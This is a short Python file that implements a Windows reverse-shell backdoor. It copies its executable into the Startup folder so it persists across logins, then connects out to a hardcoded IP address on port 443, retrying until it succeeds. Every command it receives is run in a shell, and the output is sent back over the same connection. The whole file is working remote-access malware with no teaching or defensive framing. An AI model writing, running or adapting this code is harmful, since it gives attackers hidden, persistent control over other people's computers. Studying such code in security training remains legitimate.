import socket
import time
import subprocess
import threading
import os

# IP/PORT
IP = "192.168.100.104"
PORT = 443

# AUTORUN
def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_filename))

#CONNECT
def connect(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))
        return client
    except Exception as error:
        print("CONNECTING ERROR", error)

#CMD
def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        print("CMD ERROR", error)

#LISTEN
def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()

    except Exception as error:
        print("LISTENING ERROR", error)
        client.close()

#MAIN
if __name__ == "__main__":
    autorun()
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)
        else:
            print("ERROR, TRYING TO CONNECT AGAIN...")
            time.sleep(3)
